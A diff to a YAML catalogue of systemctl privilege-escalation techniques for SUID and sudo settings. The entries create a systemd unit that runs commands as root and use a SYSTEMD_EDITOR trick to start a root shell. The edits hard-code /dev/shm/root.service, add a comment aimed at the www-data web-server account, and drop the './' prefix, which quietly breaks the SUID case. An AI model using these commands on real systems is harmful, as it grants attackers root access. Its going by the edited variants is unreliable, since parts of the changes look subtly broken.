@@ -2,22 +2,24 @@
 functions:
   suid:
     - code: |
-        TF=$(mktemp).service
+        TF=/dev/shm/root.service
         echo '[Service]
         Type=oneshot
         ExecStart=/bin/sh -c "id > /tmp/output"
         [Install]
         WantedBy=multi-user.target' > $TF
-        ./systemctl link $TF
-        ./systemctl enable --now $TF
+        systemctl link $TF
+        systemctl enable --now $TF
+        # www-data needs to run this:
+        systemctl start $TF
   sudo:
     - code: |
-        TF=$(mktemp)
+        TF=/dev/shm/root.service
         echo /bin/sh >$TF
         chmod +x $TF
         sudo SYSTEMD_EDITOR=$TF systemctl edit system.slice
     - code: |
-        TF=$(mktemp).service
+        TF=/dev/shm/root.service
         echo '[Service]
         Type=oneshot
         ExecStart=/bin/sh -c "id > /tmp/output"
